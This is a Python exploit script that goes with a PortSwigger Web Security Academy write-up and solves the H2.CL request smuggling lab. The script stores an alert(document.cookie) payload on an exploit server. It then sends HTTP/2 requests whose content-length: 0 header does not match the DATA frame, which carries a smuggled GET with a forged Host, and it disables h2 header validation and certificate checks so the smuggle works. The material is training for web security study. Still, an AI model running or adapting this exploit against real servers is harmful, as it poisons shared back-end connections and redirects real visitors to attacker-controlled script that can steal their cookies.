#!/usr/bin/env python3
"""
H2.CL request smuggling
PortSwigger Web Security Academy -- HTTP Request Smuggling

Companion script for the writeup: 09-h2-cl-request-smuggling.md

What this does:
    Stores "alert(document.cookie)" as a JavaScript response on the
    PortSwigger exploit server at /resources, then repeatedly sends an
    HTTP/2 request with "content-length: 0" in the HEADERS frame while a
    real smuggled request rides along in the DATA frame. The front-end
    forwards a zero-length body to the back-end during downgrade (trusting
    the HTTP/2-layer content-length), leaving our DATA frame bytes --
    a complete "GET /resources" request with a forged Host pointing at the
    exploit server -- sitting in the back-end's buffer as the start of the
    next request. Once a real visitor's next JS-resource fetch lands on
    that poisoned connection, they get redirected to the exploit server
    and execute the stored payload, which is what flips the lab to solved.

    The h2 library normally refuses to send a content-length that
    contradicts the DATA frame it's actually transmitting, since HTTP/2 has
    no such thing as a length mismatch at the protocol level -- this only
    works with validate_outbound_headers=False and
    normalize_outbound_headers=False set explicitly, which is the fix that
    turned this from "looks infeasible outside Burp" into a working script.

Usage:
    python 09-h2-cl-request-smuggling.py <lab-url> <exploit-server-url>
    e.g. python 09-h2-cl-request-smuggling.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net https://exploit-0a1b00fa03d9c8b6803b56b400eb00d5.exploit-server.net

Requirements:
    pip install h2 httpx
"""

import socket
import ssl
import sys
import time
from urllib.parse import urlparse

import httpx


def create_h2_connection(host: str, port: int = 443, timeout: float = 10.0):
    import h2.connection as h2c
    import h2.config as h2cfg

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(["h2"])
    sock = socket.create_connection((host, port), timeout=timeout)
    ssl_sock = ctx.wrap_socket(sock, server_hostname=host)

    config = h2cfg.H2Configuration(
        client_side=True, header_encoding="utf-8",
        validate_outbound_headers=False,
        normalize_outbound_headers=False,
    )
    conn = h2c.H2Connection(config=config)
    conn.initiate_connection()
    ssl_sock.sendall(conn.data_to_send())

    ssl_sock.settimeout(3)
    try:
        data = ssl_sock.recv(65535)
        conn.receive_data(data)
        ssl_sock.sendall(conn.data_to_send())
    except socket.timeout:
        pass

    return ssl_sock, conn


def lab_solved(base_url: str) -> bool:
    try:
        r = httpx.get(base_url + "/", verify=False, timeout=10)
        return "is-solved" in r.text
    except Exception:
        return False


def solve(lab_url: str, exploit_server_url: str, max_attempts: int = 30) -> None:
    import h2.events as h2e

    host = urlparse(lab_url).hostname
    exploit_host = urlparse(exploit_server_url).hostname

    print("[*] Storing alert(document.cookie) on the exploit server at /resources...")
    try:
        r = httpx.post(exploit_server_url, data={
            "urlIsHttps": "on",
            "responseFile": "/resources",
            "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/javascript\r\nAccess-Control-Allow-Origin: *",
            "responseBody": "alert(document.cookie)",
            "formAction": "STORE",
        }, verify=False, follow_redirects=True, timeout=10)
        print(f"    Exploit stored: {r.status_code}")
    except Exception as e:
        print(f"[-] Failed to store exploit payload: {e}")
        return

    # DATA frame body: a complete GET /resources request with Host forged to the
    # exploit server, so whoever's next request completes this smuggle gets
    # redirected there and executes the stored JS.
    smuggled = (
        "GET /resources HTTP/1.1\r\n"
        f"Host: {exploit_host}\r\n"
        "Content-Length: 10\r\n"
        "\r\n"
        "x=1234567"
    )

    print("[*] Firing H2.CL smuggle requests (content-length: 0 in HEADERS, real "
          "body in DATA) until the lab's simulated visitor completes the smuggled "
          "redirect and executes the stored payload...")

    for attempt in range(1, max_attempts + 1):
        if lab_solved(lab_url):
            print(f"[+] Lab solved on attempt {attempt}.")
            return

        try:
            ssl_sock, conn = create_h2_connection(host)
            headers = [
                (":method", "POST"),
                (":path", "/"),
                (":authority", host),
                (":scheme", "https"),
                ("content-type", "application/x-www-form-urlencoded"),
                ("content-length", "0"),
            ]
            stream_id = conn.get_next_available_stream_id()
            conn.send_headers(stream_id, headers, end_stream=False)
            conn.send_data(stream_id, smuggled.encode(), end_stream=True)
            ssl_sock.sendall(conn.data_to_send())

            ssl_sock.settimeout(5)
            try:
                while True:
                    chunk = ssl_sock.recv(4096)
                    if not chunk:
                        break
                    events = conn.receive_data(chunk)
                    for event in events:
                        if isinstance(event, h2e.StreamEnded):
                            break
                    ssl_sock.sendall(conn.data_to_send())
            except socket.timeout:
                pass
            ssl_sock.close()
        except Exception as e:
            if attempt == 1:
                print(f"  [!] Error: {e}")

        time.sleep(0.5)
        if attempt % 10 == 0:
            print(f"  [*] Attempt {attempt}/{max_attempts}...")

    if lab_solved(lab_url):
        print("[+] Lab solved.")
    else:
        print(f"[-] Not solved after {max_attempts} attempts -- this depends on the "
              f"victim's next JS-resource fetch landing on our poisoned connection, "
              f"rerun to keep trying.")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: python {sys.argv[0]} <lab-url> <exploit-server-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"), sys.argv[2].rstrip("/"))
